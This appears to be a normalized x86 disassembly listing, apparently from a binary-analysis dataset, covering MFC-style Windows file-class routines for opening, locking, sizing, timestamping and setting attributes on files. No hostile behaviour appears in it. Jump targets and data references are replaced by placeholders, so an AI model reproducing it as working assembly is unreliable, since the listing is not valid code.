mov eax [ esi + 0x4 ]
cmp eax 0xffffffff
je r-xdata
pop esi
retn
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
push [ esi + 0xc ]
call [ GetLastError@IAT ]
push eax
call sub_4082be
sub_405968
push esi
push [ esp + 0x14 ]
mov esi ecx
push [ esp + 0x14 ]
push [ esp + 0x14 ]
push [ esp + 0x14 ]
push [ esi + 0x4 ]
call [ LockFile@IAT ]
test eax eax
jne r-xdata
pop esi
retn 0x10
push [ esi + 0xc ]
call [ GetLastError@IAT ]
push eax
call sub_4082be
sub_40599b
push esi
push [ esp + 0x14 ]
mov esi ecx
push [ esp + 0x14 ]
push [ esp + 0x14 ]
push [ esp + 0x14 ]
push [ esi + 0x4 ]
call [ UnlockFile@IAT ]
test eax eax
jne r-xdata
pop esi
retn 0x10
push [ esi + 0xc ]
call [ GetLastError@IAT ]
push eax
call sub_4082be
sub_4059ce
push esi
push 0x0
push [ esp + 0x10 ]
mov esi ecx
push [ esp + 0x10 ]
mov eax [ esi ]
call [ eax + 0x28 ]
push [ esi + 0x4 ]
call [ SetEndOfFile@IAT ]
test eax eax
jne r-xdata
pop esi
retn 0x8
push [ esi + 0xc ]
call [ GetLastError@IAT ]
push eax
call sub_4082be
sub_405a00
push ebp
mov ebp esp
push ecx
push ecx
push edi
lea eax [ ebp - 0x4 ]
mov edi ecx
push eax
push [ edi + 0x4 ]
call [ GetFileSize@IAT ]
cmp eax 0xffffffff
mov [ ebp - 0x8 ] eax
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop edi
leave
retn
push esi
mov esi [ GetLastError@IAT ]
call esi
test eax eax
je r-xdata
pop esi
push [ edi + 0xc ]
call esi
push eax
call sub_4082be
sub_405a3f
push ebp
mov ebp esp
sub esp 0x108
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0xc ]
test esi esi
push edi
mov edi [ ebp + 0x8 ]
mov ebx esi
jne r-xdata
push [ ebp + 0x10 ]
push ebx
push edi
call [ GetFileTitleA@IAT ]
test ax ax
je r-xdata
lea ebx [ ebp - 0x108 ]
mov [ ebp + 0x10 ] 0x104
test esi esi
jne r-xdata
push [ ebp + 0x10 ]
push esi
push edi
call sub_408390
jmp r-xdata
xor eax eax
push ebx
call [ lstrlenA@IAT ]
inc eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40f589
leave
retn 0xc
sub_405aab
push esi
mov esi ecx
mov eax [ esi ]
lea ecx [ eax - 0x10 ]
xor edx edx
cmp [ ecx + 0x4 ] edx
push edi
mov edi [ ecx ]
je r-xdata
pop edi
pop esi
retn
cmp [ ecx + 0xc ] edx
jge r-xdata
call sub_4056ce
mov eax [ edi ]
mov ecx edi
call [ eax + 0xc ]
add eax 0x10
mov [ esi ] eax
cmp [ eax - 0x8 ] edx
jge r-xdata
mov [ eax - 0xc ] edx
mov eax [ esi ]
mov [ eax ] dl
jmp r-xdata
push 0x80070057
call sub_401090
sub_405aee
mov eax [ esp + 0x4 ]
cmp eax 0xffffffff
push esi
mov esi ecx
jne r-xdata
push eax
mov ecx esi
call sub_405776
pop esi
retn 0x4
mov eax [ esi ]
test eax eax
je r-xdata
push eax
call sub_4108e0
pop ecx
sub_405b13
push esi
mov esi ecx
mov ecx [ esp + 0x8 ]
test ecx ecx
jne r-xdata
mov eax [ ecx ]
call [ eax + 0xc ]
add eax 0x10
mov [ esi ] eax
mov eax esi
pop esi
retn 0x4
push 0x80004005
call sub_401090
sub_405b38
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi [ ecx ]
mov ebx [ esi - 0xc ]
sub esi 0x10
mov [ ebp - 0x8 ] ecx
mov ecx [ esi ]
mov eax [ ecx ]
push edi
mov [ ebp - 0x4 ] ebx
call [ eax + 0x10 ]
mov edx [ eax ]
push 0x1
push [ ebp + 0x8 ]
mov ecx eax
call [ edx ]
mov edi eax
test edi edi
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp ebx eax
jge r-xdata
call sub_4057dc
inc eax
push eax
lea ecx [ esi + 0x10 ]
push ecx
push eax
lea ebx [ edi + 0x10 ]
push ebx
call sub_4105fc
mov eax [ ebp - 0x4 ]
add esp 0x10
mov ecx esi
mov [ edi + 0x4 ] eax
call sub_4056ce
mov eax [ ebp - 0x8 ]
pop edi
pop esi
mov [ eax ] ebx
pop ebx
leave
retn 0x4
mov eax ebx
sub_405ba0
mov eax [ ecx ]
mov edx [ eax - 0xc ]
sub eax 0x10
push esi
mov esi [ esp + 0x8 ]
cmp edx esi
jle r-xdata
cmp [ eax + 0xc ] 0x1
jle r-xdata
mov esi edx
mov eax [ eax + 0x8 ]
cmp eax esi
jge r-xdata
push esi
call sub_405b38
jmp r-xdata
pop esi
retn 0x4
mov edx 0x400
cmp eax edx
jle r-xdata
add eax eax
add eax edx
jmp r-xdata
push eax
call sub_4057e7
mov eax esi
cmp eax esi
jge r-xdata
sub_405be7
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
push edi
xor edi edi
cmp eax 0xffffffff
je r-xdata
or [ esi + 0x4 ] 0xffffffff
and [ esi + 0x8 ] 0x0
add esi 0xc
mov ecx esi
call sub_405aab
test edi edi
je r-xdata
push eax
call [ CloseHandle@IAT ]
mov edi eax
neg edi
sbb edi edi
inc edi
pop edi
pop esi
retn
push [ esi ]
call [ GetLastError@IAT ]
push eax
call sub_4082be
sub_405c67
push esi
mov esi ecx
mov eax [ esi ]
xor ecx ecx
sub eax 0x10
inc ecx
sub ecx [ eax + 0xc ]
mov eax [ eax + 0x8 ]
sub eax [ esp + 0x8 ]
or ecx eax
jge r-xdata
mov eax [ esi ]
pop esi
retn 0x4
push [ esp + 0x8 ]
mov ecx esi
call sub_405ba0
sub_405cae
push ebp
mov ebp esp
push ecx
push ebx
push edi
push 0x10
mov ebx ecx
call sub_4053df
test eax eax
pop ecx
je r-xdata
xor edi edi
mov ecx eax
call sub_405c91
mov edi eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ edi + 0x4 ] eax
mov eax [ ebx + 0x8 ]
mov [ edi + 0x8 ] eax
mov eax edi
pop edi
pop ebx
leave
retn
test edi edi
je r-xdata
push esi
mov esi [ GetCurrentProcess@IAT ]
push 0x2
push 0x0
push 0x0
lea eax [ ebp - 0x4 ]
push eax
call esi
push eax
push [ ebx + 0x4 ]
call esi
push eax
call [ DuplicateHandle@IAT ]
test eax eax
pop esi
jne r-xdata
push [ ebx + 0xc ]
call [ GetLastError@IAT ]
push eax
call sub_4082be
mov eax [ edi ]
push 0x1
mov ecx edi
call [ eax + 0x4 ]
sub_405d22
push ebp
mov ebp esp
push ecx
push esi
push [ ebp + 0xc ]
mov [ ebp - 0x4 ] ecx
push [ ebp + 0x8 ]
call sub_40569f
mov esi eax
test esi esi
pop ecx
pop ecx
je r-xdata
pop esi
leave
retn 0x8
movzx eax [ esi ]
push ebx
push edi
push eax
lea edi [ esi + 0x2 ]
push edi
call sub_40579c
pop ecx
pop ecx
mov ecx [ ebp - 0x4 ]
mov ebx eax
push ebx
call sub_405c67
movzx ecx [ esi ]
push ecx
push edi
push ebx
push eax
call sub_4057b9
mov ecx [ ebp - 0x4 ]
add esp 0x10
push ebx
call sub_405776
xor eax eax
pop edi
inc eax
pop ebx
sub_405d7b
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x0
push ebx
mov ebx ecx
jne r-xdata
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
call sub_405aab
jmp r-xdata
mov eax [ ebx ]
push edi
push [ ebp + 0xc ]
mov edi [ eax - 0xc ]
sub esi eax
call sub_405c67
cmp esi edi
pop edi
push [ ebp + 0xc ]
ja r-xdata
push 0x80070057
call sub_401090
pop ebx
pop ebp
retn 0x8
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
push eax
call sub_4105fc
lea ecx [ eax + esi ]
push ecx
push [ ebp + 0xc ]
push eax
call sub_41096b
jmp r-xdata
add esp 0x10
push [ ebp + 0xc ]
mov ecx ebx
call sub_405776
pop esi
sub_405de6
mov ecx [ esp + 0x8 ]
push esi
push edi
mov esi 0x104
push esi
call sub_405c67
push esi
mov edi eax
push 0x0
push edi
call sub_4109d0
push 0xffffffff
push [ esp + 0x1c ]
push esi
push edi
call sub_405532
add esp 0x1c
push edi
call [ PathStripToRootA@IAT ]
mov ecx [ esp + 0x10 ]
push 0xffffffff
call sub_405aee
pop edi
pop esi
retn 0x8
sub_405e29
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push esi
push edi
mov edi ecx
jne r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_410479
pop ecx
pop ecx
mov esi eax
push esi
mov ecx edi
call sub_405c67
push [ ebp + 0xc ]
lea ecx [ esi + 0x1 ]
push [ ebp + 0x8 ]
push ecx
push eax
call sub_4105e1
add esp 0x10
push esi
mov ecx edi
call sub_405776
pop edi
pop esi
pop ebp
retn 0x8
push 0x80070057
call sub_401090
sub_405e78
push esi
mov esi ecx
mov ecx [ esi + 0x10 ]
sub ecx 0x10
mov [ esi ] r--data
call sub_4056ce
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call j_sub_40f613
pop ecx
sub_405ee0
push esi
mov esi [ esp + 0x8 ]
test esi esi
push edi
mov edi ecx
jne r-xdata
push esi
call sub_4108e0
pop ecx
xor eax eax
jmp r-xdata
push eax
push esi
mov ecx edi
call sub_405d7b
pop edi
pop esi
retn 0x4
sub_405f18
push ebp
sub esp 0x200
lea ebp [ esp - 0x4 ]
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x200 ] eax
push 0x10
mov eax sub_420c97
call sub_410250
mov esi ecx
mov [ ebp - 0x18 ] esi
mov [ esi ] r--data
xor edi edi
cmp [ esi + 0x4 ] 0xffffffff
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x4 ] 0x1
je r-xdata
mov ecx [ esi + 0xc ]
sub ecx 0x10
call sub_4056ce
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp + 0x200 ]
xor ecx ebp
call sub_40f589
add ebp 0x204
leave
retn
cmp [ esi + 0x8 ] edi
je r-xdata
call sub_405be7
jmp r-xdata
sub_405f6d
call sub_4082df
push eax
lea ecx [ ebp - 0x14 ]
call sub_405b13
mov esi [ ebp - 0x1c ]
mov eax [ esi ]
xor edi edi
push edi
push 0x200
lea ecx [ ebp ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x3
call [ eax + 0xc ]
test eax eax
je r-xdata
push 0x6e
push r--data
push r--data
lea eax [ ebp - 0x14 ]
push r--data
push eax
call sub_405f05
add esp 0x14
lea eax [ ebp ]
push eax
push 0x6e
push r--data
push r--data
lea eax [ ebp - 0x14 ]
push r--data
push eax
call sub_405f05
add esp 0x18
jmp r-xdata
push edi
push edi
mov edi [ ebp - 0x14 ]
push edi
call sub_4071fc
lea ecx [ edi - 0x10 ]
mov [ ebp - 0x4 ] 0x2
call sub_4056ce
mov eax [ esi ]
push 0x1
mov ecx esi
call [ eax + 0x4 ]
mov eax r-xdata
retn
sub_40604c
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn 0x8
call [ GetLastError@IAT ]
push eax
mov [ esi + 0xc ] eax
call sub_407f2a
push [ esp + 0xc ]
lea ecx [ esi + 0x10 ]
mov [ esi + 0x8 ] eax
call sub_405ee0
sub_406077
push ebp
sub esp 0x140
lea ebp [ esp - 0x4 ]
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x140 ] eax
push 0x14
mov eax sub_420cc7
call sub_41021d
mov eax [ ebp + 0x154 ]
mov edi [ ebp + 0x14c ]
mov ebx [ ebp + 0x150 ]
mov [ ebp - 0x18 ] eax
xor eax eax
test edi edi
setne al
test eax eax
jne r-xdata
xor eax eax
test ebx ebx
setne al
test eax eax
je r-xdata
call sub_4054e9
lea eax [ ebp - 0x14 ]
push eax
push edi
mov esi 0x104
push esi
push ebx
call [ GetFullPathNameA@IAT ]
test eax eax
jne r-xdata
cmp eax esi
jae r-xdata
push 0xffffffff
push ebx
push esi
push edi
call sub_405532
add esp 0x10
push ebx
push [ ebp - 0x18 ]
call sub_40604c
xor eax eax
jmp r-xdata
call sub_4082df
push eax
lea ecx [ ebp - 0x10 ]
call sub_405b13
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x10 ]
push eax
push edi
call sub_405de6
push [ ebp - 0x10 ]
call [ PathIsUNCA@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp + 0x140 ]
xor ecx ebp
call sub_40f589
add ebp 0x144
leave
retn 0xc
mov ecx [ ebp - 0x10 ]
add ecx 0xfffffff0
call sub_4056ce
xor eax eax
inc eax
push eax
push eax
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x20 ]
push ecx
push eax
push eax
push eax
push [ ebp - 0x10 ]
call [ GetVolumeInformationA@IAT ]
test eax eax
jne r-xdata
test [ ebp - 0x1c ] 0x2
jne r-xdata
push ebx
push [ ebp - 0x18 ]
call sub_40604c
test [ ebp - 0x1c ] 0x4
jne r-xdata
push edi
call [ CharUpperA@IAT ]
lea eax [ ebp ]
push eax
push ebx
call [ FindFirstFileA@IAT ]
cmp eax 0xffffffff
je r-xdata
push eax
call [ FindClose@IAT ]
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov ecx [ ebp - 0x10 ]
add ecx 0xfffffff0
call sub_4056ce
jmp r-xdata
cmp [ ebp - 0x14 ] edi
jbe r-xdata
lea eax [ ebp + 0x2c ]
push eax
call [ lstrlenA@IAT ]
mov ecx [ ebp - 0x14 ]
sub ecx edi
add eax ecx
cmp eax esi
jge r-xdata
lea eax [ ebp + 0x2c ]
push eax
sub esi ecx
push esi
push [ ebp - 0x14 ]
call sub_405628
add esp 0xc
sub_406200
push 0x4
mov eax sub_420cfa
call sub_41021d
mov esi ecx
mov [ ebp - 0x10 ] esi
call sub_40555e
lea edi [ esi + 0x10 ]
mov ecx edi
mov [ esi ] r--data
call sub_405c49
mov eax [ ebp + 0x8 ]
push [ ebp + 0x10 ]
and [ ebp - 0x4 ] 0x0
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov ecx edi
mov [ esi + 0xc ] eax
call sub_405ee0
mov eax esi
call sub_4102bc
retn 0xc
sub_40625f
push 0x4
mov eax sub_420d1d
call sub_41021d
mov esi ecx
mov [ ebp - 0x10 ] esi
call sub_4082df
push eax
mov ecx esi
call sub_405b13
push [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov ecx esi
call sub_405ec0
test al al
jne r-xdata
mov eax esi
call sub_4102bc
retn 0x4
push [ ebp + 0x8 ]
mov ecx esi
call sub_405ee0
sub_4062a3
push ebp
lea ebp [ esp - 0xa0 ]
sub esp 0x120
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x9c ] eax
mov eax [ ebp + 0xa8 ]
push ebx
mov ebx [ ebp + 0xac ]
push esi
mov esi ecx
and [ esi + 0x8 ] 0x0
or [ esi + 0x4 ] 0xffffffff
push edi
mov [ ebp - 0x6c ] eax
mov eax [ ebp + 0xb0 ]
lea edi [ esi + 0xc ]
mov ecx edi
mov [ ebp - 0x74 ] eax
and ebx 0xffff7fff
call sub_405aab
cmp [ ebp - 0x6c ] 0x0
je r-xdata
xor eax eax
push [ ebp - 0x6c ]
call [ lstrlenA@IAT ]
cmp eax 0x104
jge r-xdata
push [ ebp - 0x74 ]
lea eax [ ebp - 0x68 ]
push [ ebp - 0x6c ]
push eax
call sub_406077
test eax eax
je r-xdata
lea eax [ ebp - 0x68 ]
push eax
mov ecx edi
call sub_405ee0
push 0x3
mov eax ebx
pop edx
xor ecx ecx
and eax edx
sub eax ecx
mov [ ebp - 0x70 ] ecx
je r-xdata
mov [ ebp - 0x70 ] 0x80000000
dec eax
je r-xdata
xor edx edx
cmp eax 0x10
je r-xdata
mov [ ebp - 0x70 ] 0x40000000
jmp r-xdata
dec eax
jne r-xdata
push 0x3
pop eax
mov eax ebx
and eax 0x2000
neg eax
sbb eax eax
and eax 0x2
inc eax
inc eax
jmp r-xdata
cmp eax 0x20
je r-xdata
mov eax ebx
and eax 0x70
push 0x1
pop edi
je r-xdata
mov [ ebp - 0x70 ] 0xc0000000
jmp r-xdata
test ebx 0x20000
je r-xdata
mov ecx 0x20000080
test ebx 0x10000
mov ecx 0x80
je r-xdata
mov edx edi
jmp r-xdata
cmp eax 0x30
je r-xdata
test ebx 0x40000
je r-xdata
or ecx 0x80000000
mov eax ebx
shr eax 0x7
not eax
and eax edi
test bx 0x1000
mov [ ebp - 0x80 ] 0xc
mov [ ebp - 0x7c ] ecx
mov [ ebp - 0x78 ] eax
je r-xdata
push 0x2
pop edx
jmp r-xdata
cmp eax 0x40
je r-xdata
test ebx 0x80000
je r-xdata
or ecx 0x10000000
push 0x0
push ecx
push eax
lea eax [ ebp - 0x80 ]
push eax
push edx
push [ ebp - 0x70 ]
push [ ebp - 0x6c ]
call [ CreateFileA@IAT ]
cmp eax 0xffffffff
jne r-xdata
or ecx 0x8000000
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] edi
mov eax edi
jmp r-xdata
push [ ebp - 0x6c ]
push [ ebp - 0x74 ]
call sub_40604c
mov ecx [ ebp + 0x9c ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40f589
add ebp 0xa0
leave
retn 0xc
sub_406444
push ebp
mov ebp esp
sub esp 0x18
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x8 ]
call [ FileTimeToLocalFileTime@IAT ]
test eax eax
je r-xdata
leave
retn 0x4
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
call [ FileTimeToSystemTime@IAT ]
neg eax
sbb eax eax
neg eax
sub_406473
push ebp
mov ebp esp
sub esp 0x24
cmp [ ebp + 0x8 ] 0x76c
push esi
mov esi ecx
jge r-xdata
push ebx
mov ebx [ ebp + 0xc ]
lea eax [ ebx - 0x1 ]
cmp eax 0xb
push edi
ja r-xdata
push 0x80004005
mov edx [ ebp + 0x10 ]
lea eax [ edx - 0x1 ]
cmp eax 0x1e
ja r-xdata
mov edi [ ebp + 0x14 ]
cmp edi 0x17
ja r-xdata
mov ecx [ ebp + 0x18 ]
cmp ecx 0x3b
ja r-xdata
mov eax [ ebp + 0x1c ]
cmp eax 0x3b
ja r-xdata
mov [ ebp - 0x24 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xfffff894
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x24 ]
dec ebx
push eax
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x14 ] ebx
call sub_410cfd
pop ecx
mov [ esi ] eax
and eax edx
cmp eax 0xffffffff
pop edi
mov [ esi + 0x4 ] edx
pop ebx
jne r-xdata
mov eax esi
pop esi
leave
retn 0x1c
push 0x80070057
jmp r-xdata
call sub_401090
sub_406506
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
movzx ecx [ eax ]
cmp cx 0x76c
jae r-xdata
push [ ebp + 0xc ]
movzx edx [ eax + 0xc ]
push edx
movzx edx [ eax + 0xa ]
push edx
movzx edx [ eax + 0x8 ]
push edx
movzx edx [ eax + 0x6 ]
movzx eax [ eax + 0x2 ]
push edx
push eax
movzx eax cx
push eax
lea ecx [ ebp - 0x8 ]
call sub_406473
mov eax [ ebp - 0x8 ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
and [ esi ] 0x0
and [ esi + 0x4 ] 0x0
jmp r-xdata
mov eax esi
pop esi
leave
retn 0x8
sub_40655e
push ebp
mov ebp esp
sub esp 0x20
push esi
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0x8 ]
mov esi ecx
call [ FileTimeToLocalFileTime@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call [ FileTimeToSystemTime@IAT ]
test eax eax
je r-xdata
and [ esi ] 0x0
and [ esi + 0x4 ] 0x0
push 0x80070057
call sub_401090
push [ ebp + 0xc ]
lea eax [ ebp - 0x20 ]
push eax
lea ecx [ ebp - 0x8 ]
call sub_406506
mov eax [ ebp - 0x8 ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
mov eax esi
pop esi
leave
retn 0x8
sub_4065bc
push ebp
mov ebp esp
sub esp 0x24
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push ecx
lea eax [ ebp - 0x24 ]
push eax
call sub_410d0a
test eax eax
pop ecx
pop ecx
je r-xdata
push 0x80004005
call sub_401090
mov eax [ ebp + 0x8 ]
push esi
push edi
mov edi [ ebp + 0x8 ]
push 0x9
pop ecx
lea esi [ ebp - 0x24 ]
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
jmp r-xdata
leave
retn 0x4
sub_4066a6
push esi
mov esi [ esp + 0x8 ]
mov ecx [ esi ]
mov eax [ ecx ]
push edi
call [ eax + 0x10 ]
lea edx [ esi + 0xc ]
cmp [ edx ] 0x0
jl r-xdata
mov edx [ eax ]
push 0x1
push [ esi + 0x4 ]
mov ecx eax
call [ edx ]
mov edi eax
test edi edi
jne r-xdata
cmp eax [ esi ]
jne r-xdata
mov eax [ esi + 0x4 ]
mov [ edi + 0x4 ] eax
mov eax [ esi + 0x4 ]
inc eax
push eax
add esi 0x10
push esi
push eax
lea eax [ edi + 0x10 ]
push eax
call sub_4105fc
add esp 0x10
jmp sub_4057dc
xor eax eax
mov edi esi
inc eax
[ edx ] eax
jmp r-xdata
mov eax edi
pop edi
pop esi
retn
sub_406701
push ebp
lea ebp [ esp - 0xcc ]
sub esp 0x14c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0xc8 ] eax
push esi
mov esi [ ebp + 0xd8 ]
push edi
mov edi [ ebp + 0xd4 ]
test edi edi
jne r-xdata
push edi
call [ lstrlenA@IAT ]
cmp eax 0x104
jge r-xdata
xor eax eax
jmp r-xdata
push ebx
push edi
lea ebx [ esi + 0x22 ]
push ebx
call sub_4061ee
test eax eax
jne r-xdata
mov ecx [ ebp + 0xc8 ]
pop edi
xor ecx ebp
pop esi
call sub_40f589
add ebp 0xcc
leave
retn 0x8
lea eax [ ebp - 0x78 ]
push eax
push edi
call [ FindFirstFileA@IAT ]
or edi 0xffffffff
cmp eax edi
jne r-xdata
mov [ ebx ] al
jmp r-xdata
push eax
call [ FindClose@IAT ]
mov al [ ebp - 0x78 ]
and al 0x7f
mov [ esi + 0x20 ] al
mov eax [ ebp - 0x58 ]
cdq
mov [ esi + 0x18 ] eax
lea eax [ ebp - 0x74 ]
push eax
mov [ esi + 0x1c ] edx
call sub_406444
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
and [ esi ] 0x0
and [ esi + 0x4 ] 0x0
push edi
lea eax [ ebp - 0x74 ]
push eax
lea ecx [ ebp - 0x80 ]
call sub_40655e
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
jmp r-xdata
pop ebx
xor eax eax
xor ecx ecx
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] ecx
push edi
lea eax [ ebp - 0x6c ]
push eax
lea ecx [ ebp - 0x80 ]
call sub_40655e
mov ecx [ eax ]
mov [ esi + 0x10 ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x14 ] eax
jmp r-xdata
lea eax [ ebp - 0x6c ]
push eax
call sub_406444
test eax eax
je r-xdata
xor eax eax
xor ecx ecx
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] ecx
push edi
lea eax [ ebp - 0x64 ]
push eax
lea ecx [ ebp - 0x80 ]
call sub_40655e
mov ecx [ eax ]
mov [ esi + 0x8 ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0xc ] eax
jmp r-xdata
lea eax [ ebp - 0x64 ]
push eax
call sub_406444
test eax eax
je r-xdata
mov eax [ esi + 0x10 ]
or eax [ esi + 0x14 ]
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ esi ] eax
mov eax [ esi + 0xc ]
mov [ esi + 0x4 ] eax
mov eax [ esi ]
or eax [ esi + 0x4 ]
jne r-xdata
xor eax eax
inc eax
mov eax [ esi + 0x8 ]
mov [ esi + 0x10 ] eax
mov eax [ esi + 0xc ]
mov [ esi + 0x14 ] eax
sub_40685a
push ebp
mov ebp esp
sub esp 0x18
cmp [ ebp + 0xc ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0x8 ]
mov ecx esi
call sub_4065fc
mov ecx esi
mov [ ebp - 0x18 ] ax
call sub_40661c
mov ecx esi
mov [ ebp - 0x16 ] ax
call sub_406638
mov ecx esi
mov [ ebp - 0x12 ] ax
call sub_406653
mov ecx esi
mov [ ebp - 0x10 ] ax
call sub_40666f
mov ecx esi
mov [ ebp - 0xe ] ax
call sub_40668b
and [ ebp - 0xa ] 0x0
mov [ ebp - 0xc ] ax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call [ SystemTimeToFileTime@IAT ]
test eax eax
mov esi [ GetLastError@IAT ]
jne r-xdata
jmp sub_4054e9
push [ ebp + 0xc ]
lea eax [ ebp - 0x8 ]
push eax
call [ LocalFileTimeToFileTime@IAT ]
test eax eax
jne r-xdata
push 0x0
call esi
push eax
call sub_4082be
pop esi
leave
retn
push eax
call esi
push eax
call sub_4082be
sub_4068f5
push ebp
mov ebp esp
sub esp 0x24
push ebx
push esi
push edi
push [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ebx
call [ GetFileAttributesA@IAT ]
cmp eax 0xffffffff
mov edi [ GetLastError@IAT ]
mov [ ebp - 0x4 ] eax
jne r-xdata
mov esi [ ebp + 0xc ]
movzx eax [ esi + 0x20 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
push [ ebp + 0x8 ]
call edi
push eax
call sub_4082be
lea eax [ esi + 0x8 ]
mov ecx [ eax ]
or ecx [ eax + 0x4 ]
je r-xdata
test [ ebp - 0x4 ] 0x1
je r-xdata
movzx eax [ esi + 0x20 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
lea ecx [ ebp - 0x24 ]
push ecx
push eax
call sub_40685a
pop ecx
lea eax [ esi + 0x10 ]
pop ecx
mov ecx [ eax ]
or ecx [ eax + 0x4 ]
je r-xdata
push eax
push [ ebp + 0x8 ]
call [ SetFileAttributesA@IAT ]
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x8
test [ ebp - 0x4 ] 0x1
jne r-xdata
mov eax [ esi ]
or eax [ esi + 0x4 ]
je r-xdata
lea ecx [ ebp - 0x14 ]
push ecx
push eax
call sub_40685a
pop ecx
lea eax [ ebp - 0x14 ]
pop ecx
mov [ ebp - 0x8 ] eax
push [ ebp + 0x8 ]
call edi
push eax
call sub_4082be
push eax
push [ ebp + 0x8 ]
call [ SetFileAttributesA@IAT ]
test eax eax
jne r-xdata
push ebx
push 0x80
push 0x3
push ebx
push 0x1
push 0xc0000000
push [ ebp + 0x8 ]
call [ CreateFileA@IAT ]
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
lea eax [ ebp - 0x1c ]
push eax
push esi
call sub_40685a
pop ecx
lea eax [ ebp - 0x1c ]
pop ecx
mov [ ebp - 0xc ] eax
push [ ebp + 0x8 ]
call edi
push eax
call sub_4082be
lea eax [ ebp - 0x24 ]
push eax
push [ ebp - 0x8 ]
push [ ebp - 0xc ]
push ebx
call [ SetFileTime@IAT ]
test eax eax
jne r-xdata
push [ ebp + 0x8 ]
call edi
push eax
call sub_4082be
push ebx
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
push [ ebp + 0x8 ]
call edi
push eax
call sub_4082be
push [ ebp + 0x8 ]
call edi
push eax
call sub_4082be
sub_406a32
mov eax [ esp + 0x4 ]
mov eax [ eax ]
push esi
sub eax 0x10
push eax
mov esi ecx
call sub_4066a6
add eax 0x10
mov [ esi ] eax
pop ecx
mov eax esi
pop esi
retn 0x4
sub_406a50
push ebp
mov ebp esp
sub esp 0x20
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push 0x128
xor ebx ebx
push ebx
push esi
mov edi ecx
call sub_4109d0
push 0xffffffff
push [ edi + 0xc ]
lea eax [ esi + 0x22 ]
push 0x104
push eax
call sub_405532
mov eax [ edi + 0x4 ]
add esp 0x1c
cmp eax [ r--data ]
je r-xdata
xor eax eax
inc eax
lea ecx [ ebp - 0x18 ]
push ecx
lea ecx [ ebp - 0x10 ]
push ecx
lea ecx [ ebp - 0x8 ]
push ecx
push eax
call [ GetFileTime@IAT ]
test eax eax
jne r-xdata
push ebx
push [ edi + 0x4 ]
call [ GetFileSize@IAT ]
cmp eax 0xffffffff
mov [ esi + 0x18 ] eax
mov [ esi + 0x1c ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
mov edi [ edi + 0xc ]
cmp [ edi - 0xc ] ebx
jne r-xdata
cmp ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x4
push edi
call [ GetFileAttributesA@IAT ]
cmp eax 0xffffffff
